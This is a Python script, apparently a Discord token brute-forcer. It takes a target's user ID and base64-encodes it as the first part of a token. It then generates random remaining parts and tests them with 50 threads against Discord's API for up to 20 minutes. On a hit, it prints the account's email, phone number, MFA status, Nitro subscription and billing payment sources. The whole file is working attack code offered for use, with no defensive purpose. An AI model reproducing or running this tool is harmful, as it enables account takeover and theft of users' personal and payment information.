import base64
import random
import string
import time
import os
import requests
from colorama import Fore, init
from concurrent.futures import ThreadPoolExecutor, as_completed
from threading import Event

init(autoreset=True)

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

clear()

ascii_art = r"""


                                         ___  ________    _______  _________   
                                        |\  \|\   ___ \  /  ___  \|\___   ___\ 
                                        \ \  \ \  \_|\ \/__/|_/  /\|___ \  \_| 
                                         \ \  \ \  \ \\ \__|//  / /    \ \  \  
                                          \ \  \ \  \_\\ \  /  /_/__    \ \  \ 
                                           \ \__\ \_______\|\________\   \ \__\
                                            \|__|\|_______| \|_______|    \|__|
                                                                            
                                                                            
                                                                            
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     
                                                   
"""

print(Fore.MAGENTA + ascii_art)
userid = input(Fore.YELLOW + " [ENTER] USER ID : ")

encodedStr = base64.b64encode(userid.encode("utf-8")).decode("utf-8").rstrip("=")
print(Fore.GREEN + f'\n [LOGS] TOKEN FIRST PART : {encodedStr}')

def generate_random_token_part(length):
    return ''.join(random.choices(string.ascii_letters + string.digits + '-_', k=length))


def generate_discord_token():
    third_part_length = random.randint(27, 38)
    return f"{encodedStr}.{generate_random_token_part(6)}.{generate_random_token_part(third_part_length)}"
    
def test_token(token):
    try:
        r = requests.get('https://discord.com/api/v9/users/@me', headers={'Authorization': token}, timeout=5)
        if r.status_code == 200:
            return token, r.json()
    except:
        pass
    return None, None

def get_data(endpoint, token):
    try:
        res = requests.get(endpoint, headers={'Authorization': token}, timeout=5)
        return res.json() if res.status_code == 200 else 'Unavailable'
    except:
        return 'Unavailable'

search_permission = input(Fore.YELLOW + "\n [INPUT] Do you want to search for matching tokens? (y/n): \n").lower()

if search_permission == 'y':
    found_event = Event()
    max_duration = 20 * 60
    start_time = time.time()

    def worker():
        while not found_event.is_set() and time.time() - start_time < max_duration:
            token = generate_discord_token()
            print(Fore.RED + f"\r [INFO] Trying token: {token}", end="")
            result_token, user_info = test_token(token)
            if result_token:
                found_event.set()
                print(Fore.GREEN + f"\n [INFO] MATCHING TOKEN FOUND: {result_token}")
                print(Fore.MAGENTA + ascii_art)

                username = f"{user_info['username']}#{user_info['discriminator']}"
                user_id = user_info['id']
                email = user_info['email']
                phone = user_info.get('phone', 'No phone number')
                verified = user_info['verified']
                mfa_enabled = get_data('https://discord.com/api/v9/users/@me/mfa', result_token) != 'Unavailable'
                billing_methods = get_data('https://discord.com/api/v9/users/@me/billing/payment-sources', result_token)
                nitro = get_data('https://discord.com/api/v9/users/@me/billing/subscriptions', result_token)

                print(Fore.CYAN + f"\nUsername: {username}")
                print(Fore.CYAN + f"User ID: {user_id}")
                print(Fore.CYAN + f"MFA enabled: {'Yes' if mfa_enabled else 'No'}")
                print(Fore.CYAN + f"Email: {email}")
                print(Fore.CYAN + f"Phone: {phone}")
                print(Fore.CYAN + f"Verified: {'Yes' if verified else 'No'}")
                print(Fore.CYAN + f"Nitro: {nitro}")
                print(Fore.CYAN + f"Billing Method(s): {billing_methods}")
                break

    with ThreadPoolExecutor(max_workers=50) as executor:
        for _ in range(50):
            executor.submit(worker)

        while not found_event.is_set() and (time.time() - start_time < max_duration):
            time.sleep(0.1)

    if not found_event.is_set():
        print(Fore.RED + "\n [INFO] No matching token found in the given time.")
else:
    print(Fore.RED + "\n [LOGS] Search aborted.")

input("")
